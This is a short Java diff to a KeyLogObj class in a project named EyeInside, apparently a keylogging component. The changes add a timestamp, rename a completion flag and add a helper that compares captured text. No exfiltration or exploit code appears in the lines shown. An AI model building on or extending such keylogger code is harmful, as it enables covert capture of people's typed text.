@@ -1,5 +1,7 @@
 package com.code4bones.EyeInside;
 
+import java.util.Date;
+
 import com.code4bones.utils.NetLog;
 
 public class KeyLogObj {
@@ -13,14 +15,16 @@ public class KeyLogObj {
 	
 	public String mText;
 	public String mClass;
+	public Date   mDate;
 	
-	public boolean mOpen = false;
+	public boolean mComplete = false;
 	public EventState mState;
 	
 	public KeyLogObj(String clazz,String text) {
 		mText  = text;
 		mClass = clazz;
-		mState = EventState.WAIT_CLICK;
+		mComplete = false;
+		mDate = new Date();
 	}
 
 	public void replaceText(String text) {
@@ -41,6 +45,10 @@ public class KeyLogObj {
 		boolean ok = avg < 25.0f;
 		//NetLog.v("Compare:OLD[%s](%d) to NEW[%s](%d) => %s (%d) [%.2f]",mText,mText.length(),text,text.length(),ok,len,avg);
 		return ok;
+	}
+	
+	public float compareAvg(String with) {
+		return compareAvg(with.toCharArray(),mText.toCharArray(),Math.min(with.length(), mText.length()));
 	}
 	
 	public float compareAvg(char[] olds,char[] news,int len) {
